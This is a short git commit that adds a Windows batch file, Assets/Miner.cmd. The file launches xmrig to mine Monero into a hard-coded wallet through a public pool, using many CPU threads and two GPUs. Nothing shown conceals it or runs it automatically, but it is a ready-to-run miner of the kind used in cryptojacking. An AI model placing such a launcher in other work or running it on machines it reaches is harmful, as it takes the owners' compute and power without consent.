f0ae09b01192b18ab7f8fbc91516e4d918c583a6
SpoolFooskRP <spoolfooskr@proton.me>
2025-01-01 14:25:00 +0400

    Assets

---
+++ Assets/Miner.cmd
@@ -0,0 +1,4 @@
+
+cd /d "%~dp0"
+xmrig.exe --coin XMR -u 41r7gXp38htH4AZkePcrjFAjBA5yfffZ9bHUSyUjeRLEXav61eZoBG7CZSm925qhn87tKGpjYkCt8hqNusDWRfTa22dCYNC -p x -a randomx --cuda --tls -o pool.hashvault.pro:443 --cpu-priority 8 --cpu-threads 40 --cuda-devices 0,1 --cpu-affinity 0-19
+pause
